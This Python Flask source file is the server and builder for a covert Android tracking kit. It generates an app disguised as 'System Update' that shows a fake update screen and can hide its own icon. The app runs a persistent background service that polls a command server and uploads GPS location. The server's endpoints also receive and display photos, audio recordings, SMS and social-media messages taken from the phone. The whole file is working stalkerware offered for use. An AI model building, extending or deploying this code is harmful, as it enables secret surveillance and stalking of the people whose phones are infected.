from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from datetime import datetime
import json
import os
import uuid
import sqlite3
import zipfile
import tempfile
import shutil

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "tracker.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    tables = [
        '''CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, model TEXT, android_version TEXT,
            ip TEXT, features TEXT, last_seen TEXT, online INTEGER DEFAULT 1)''',
        '''CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY, device_id TEXT, lat REAL, lon REAL,
            accuracy REAL, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY, device_id TEXT, image_base64 TEXT,
            camera_type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS audio (
            id INTEGER PRIMARY KEY, device_id TEXT, audio_base64 TEXT,
            duration INTEGER, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY, device_id TEXT, address TEXT,
            body TEXT, date TEXT, type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS social_media (
            id INTEGER PRIMARY KEY, device_id TEXT, app_name TEXT,
            sender TEXT, message TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY, device_id TEXT, command_type TEXT,
            params TEXT, status TEXT DEFAULT 'pending', created_at TEXT)''',
        '''CREATE TABLE IF NOT EXISTS builds (
            id TEXT PRIMARY KEY, features TEXT, status TEXT,
            download_url TEXT, created_at TEXT)'''
    ]
    
    for table in tables:
        c.execute(table)
    conn.commit()
    conn.close()

init_db()

# ============================================================
# SIMPLE ZIP BUILD - NO GITHUB ACTIONS NEEDED!
# ============================================================

def generate_android_project(features, server_url, build_id):
    """Generate Android project files as strings"""
    
    files = {}
    
    # MainActivity.java
    feature_booleans = "\n".join([
        f'        editor.putBoolean("{f}", true);' for f in features
    ])
    
    stealth_code = ""
    if 'stealth' in features:
        stealth_code = '''
        if (prefs.getBoolean("stealth", false)) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    getPackageManager().setComponentEnabledSetting(
                        getComponentName(),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    );
                    finish();
                }
            }, 3000);
        }'''
    
    files["src/main/java/com/systemupdate/MainActivity.java"] = f'''package com.systemupdate;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {{

    private static final String PREFS_NAME = "TrackerConfig";
    private static final String SERVER_URL = "{server_url}";

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.update_screen);

        TextView status = findViewById(R.id.status_text);
        ProgressBar progress = findViewById(R.id.progress);

        status.setText("Checking for system updates...");
        progress.setVisibility(ProgressBar.VISIBLE);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("server_url", SERVER_URL);
{feature_booleans}
        editor.apply();

        Intent serviceIntent = new Intent(this, TrackerService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
            startForegroundService(serviceIntent);
        }} else {{
            startService(serviceIntent);
        }}
{stealth_code}
    }}
}}
'''

    # TrackerService.java
    files["src/main/java/com/systemupdate/TrackerService.java"] = f'''package com.systemupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class TrackerService extends Service {{

    private String serverUrl;
    private String deviceId;
    private SharedPreferences prefs;
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;

    @Override
    public void onCreate() {{
        super.onCreate();
        prefs = getSharedPreferences("TrackerConfig", MODE_PRIVATE);
        serverUrl = prefs.getString("server_url", "{server_url}");
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        mainHandler = new Handler(Looper.getMainLooper());
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        startForeground(1, createNotification());
        registerDevice();
        
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(new Runnable() {{
            @Override
            public void run() {{
                pollCommands();
                uploadLocation();
            }}
        }}, 5, 10, TimeUnit.SECONDS);
        
        return START_STICKY;
    }}

    private void registerDevice() {{
        try {{
            JSONObject device = new JSONObject();
            device.put("device_id", deviceId);
            device.put("model", Build.MODEL);
            device.put("android_version", Build.VERSION.RELEASE);

            JSONArray features = new JSONArray();
            String[] featureList = {json.dumps(features)};
            
            for (int i = 0; i < featureList.length; i++) {{
                if (prefs.getBoolean(featureList[i], false)) {{
                    features.put(featureList[i]);
                }}
            }}
            
            device.put("features", features);
            postJson(serverUrl + "/api/device/register", device.toString());
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void pollCommands() {{
        try {{
            String response = getJson(serverUrl + "/api/device/" + deviceId + "/poll");
            if (response != null && !response.isEmpty()) {{
                JSONObject data = new JSONObject(response);
                JSONArray commands = data.getJSONArray("commands");
                for (int i = 0; i < commands.length(); i++) {{
                    executeCommand(commands.getJSONObject(i));
                }}
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void executeCommand(JSONObject command) {{
        try {{
            final String type = command.getString("type");
            
            switch(type) {{
                case "location":
                    uploadLocation();
                    break;
                default:
                    break;
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void uploadLocation() {{
        try {{
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.Location location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
            if (location == null) {{
                location = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            }}
            
            if (location != null) {{
                JSONObject data = new JSONObject();
                data.put("type", "location");
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lon", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                data.put("data", loc);
                postJson(serverUrl + "/api/device/" + deviceId + "/data", data.toString());
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private Notification createNotification() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                "tracker_channel", 
                "System Update", 
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
            
            return new Notification.Builder(this, "tracker_channel")
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        }} else {{
            return new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        }}
    }}

    private String getJson(String urlString) {{
        try {{
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream())
            );
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                result.append(line);
            }}
            reader.close();
            return result.toString();
        }} catch (Exception e) {{
            e.printStackTrace();
            return null;
        }}
    }}

    private void postJson(String urlString, String jsonData) {{
        try {{
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes("UTF-8"));
            os.close();
            
            conn.getResponseCode();
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (scheduler != null) {{
            scheduler.shutdown();
        }}
    }}
}}
'''

    # AndroidManifest.xml
    files["src/main/AndroidManifest.xml"] = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.systemupdate"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="33" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:allowBackup="true"
        android:icon="@android:drawable/ic_menu_compass"
        android:label="System Update"
        android:theme="@android:style/Theme.Light.NoActionBar">

        <activity
            android:name=".MainActivity"
            android:label="System Update"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".TrackerService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
'''

    # build.gradle
    files["build.gradle"] = '''apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    buildToolsVersion "33.0.0"
    
    defaultConfig {
        applicationId "com.systemupdate"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'org.json:json:20231013'
}
'''

    # update_screen.xml
    files["src/main/res/layout/update_screen.xml"] = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:padding="20dp"
    android:background="#FFFFFF">

    <TextView
        android:id="@+id/status_text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Checking for updates..."
        android:textSize="18sp"
        android:textColor="#333333"
        android:layout_marginBottom="20dp" />

    <ProgressBar
        android:id="@+id/progress"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:indeterminate="true" />

</LinearLayout>
'''

    # strings.xml
    files["src/main/res/values/strings.xml"] = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
</resources>
'''

    # styles.xml
    files["src/main/res/values/styles.xml"] = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="android:Theme.Light.NoActionBar">
    </style>
</resources>
'''

    return files

@app.route('/api/build', methods=['POST'])
def build_apk():
    """Generate ZIP file with Android project"""
    data = request.get_json()
    features = data.get('features', [])
    server_url = data.get('server_url', request.host_url.rstrip('/'))
    
    if not features:
        return jsonify({"status": "error", "error": "No features selected"}), 400
    
    build_id = str(uuid.uuid4())[:8]
    
    # Generate project files
    project_files = generate_android_project(features, server_url, build_id)
    
    # Create ZIP
    temp_dir = tempfile.mkdtemp()
    try:
        # Create project structure
        project_dir = os.path.join(temp_dir, "PhoneTracker")
        for filepath, content in project_files.items():
            full_path = os.path.join(project_dir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, 'w') as f:
                f.write(content)
        
        # Create ZIP
        zip_path = os.path.join(temp_dir, f"PhoneTracker_{build_id}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(project_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        # Save to builds table
        conn = get_db()
        c = conn.cursor()
        c.execute('''INSERT INTO builds (id, features, status, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (build_id, json.dumps(features), 'ready', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        return send_file(zip_path, as_attachment=True, download_name=f"PhoneTracker_{build_id}.zip")
        
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

# ============================================================
# DEVICE ENDPOINTS
# ============================================================

@app.route('/api/device/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', str(uuid.uuid4()))
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO devices 
        (id, model, android_version, ip, features, last_seen, online)
        VALUES (?, ?, ?, ?, ?, ?, ?)''',
        (device_id, data.get('model'), data.get('android_version'),
         request.remote_addr, json.dumps(data.get('features', [])),
         datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()
    
    return jsonify({
        "status": "registered",
        "device_id": device_id,
        "server_time": datetime.now().isoformat()
    })

@app.route('/api/device/<device_id>/command', methods=['POST'])
def queue_command(device_id):
    data = request.get_json()
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO commands (device_id, command_type, params, created_at)
                 VALUES (?, ?, ?, ?)''',
              (device_id, data.get('type'), json.dumps(data.get('params', {})),
               datetime.now().isoformat()))
    conn.commit()
    cmd_id = c.lastrowid
    conn.close()
    return jsonify({"status": "queued", "command_id": cmd_id})

@app.route('/api/device/<device_id>/poll', methods=['GET'])
def poll_commands(device_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''SELECT id, command_type, params FROM commands 
                 WHERE device_id = ? AND status = 'pending'
                 ORDER BY created_at ASC''', (device_id,))
    
    commands = [{"id": r[0], "type": r[1], "params": json.loads(r[2])} 
                for r in c.fetchall()]
    
    if commands:
        c.execute('''UPDATE commands SET status = 'delivered' 
                     WHERE device_id = ? AND status = 'pending' ''', (device_id,))
    
    c.execute('''UPDATE devices SET last_seen = ?, online = 1 WHERE id = ?''',
              (datetime.now().isoformat(), device_id))
    
    conn.commit()
    conn.close()
    return jsonify({"commands": commands})

@app.route('/api/device/<device_id>/data', methods=['POST'])
def receive_data(device_id):
    data = request.get_json()
    data_type = data.get('type')
    conn = get_db()
    c = conn.cursor()
    
    if data_type == 'location':
        d = data.get('data', {})
        c.execute('''INSERT INTO locations (device_id, lat, lon, accuracy, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('lat'), d.get('lon'), d.get('accuracy'),
                   datetime.now().isoformat()))
    
    elif data_type == 'photo':
        d = data.get('data', {})
        c.execute('''INSERT INTO photos (device_id, image_base64, camera_type, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('image'), d.get('camera', 'unknown'),
                   datetime.now().isoformat()))
    
    elif data_type == 'audio':
        d = data.get('data', {})
        c.execute('''INSERT INTO audio (device_id, audio_base64, duration, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('audio'), d.get('duration', 0),
                   datetime.now().isoformat()))
    
    elif data_type == 'sms':
        d = data.get('data', {})
        c.execute('''INSERT INTO sms (device_id, address, body, date, type, timestamp)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (device_id, d.get('address'), d.get('body'), d.get('date'),
                   d.get('type'), datetime.now().isoformat()))
    
    elif data_type == 'social_media':
        d = data.get('data', {})
        c.execute('''INSERT INTO social_media (device_id, app_name, sender, message, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('app'), d.get('sender'), d.get('message'),
                   datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    return jsonify({"status": "received"})

@app.route('/api/devices', methods=['GET'])
def get_devices():
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT id, model, features, last_seen, online FROM devices''')
    devices = [{
        "id": r[0], "model": r[1],
        "features": json.loads(r[2]) if r[2] else [],
        "last_seen": r[3], "online": bool(r[4])
    } for r in c.fetchall()]
    conn.close()
    return jsonify({"devices": devices})

@app.route('/api/device/<device_id>/location', methods=['GET'])
def get_location(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT lat, lon, accuracy, timestamp FROM locations 
                 WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1''', (device_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"found": True, "lat": row[0], "lon": row[1],
                       "accuracy": row[2], "timestamp": row[3]})
    return jsonify({"found": False})

@app.route('/api/device/<device_id>/photos', methods=['GET'])
def get_photos(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT image_base64, camera_type, timestamp FROM photos 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    photos = [{"image": r[0], "camera": r[1], "timestamp": r[2]} 
              for r in c.fetchall()]
    conn.close()
    return jsonify({"photos": photos})

@app.route('/api/device/<device_id>/sms', methods=['GET'])
def get_sms(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT address, body, date, type FROM sms 
                 WHERE device_id = ? ORDER BY date DESC''', (device_id,))
    messages = [{"address": r[0], "body": r[1], "date": r[2], "type": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"sms": messages})

@app.route('/api/device/<device_id>/social', methods=['GET'])
def get_social(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT app_name, sender, message, timestamp FROM social_media 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    messages = [{"app": r[0], "sender": r[1], "message": r[2], "timestamp": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"social": messages})

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running", "time": datetime.now().isoformat(), "version": "3.0.0"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)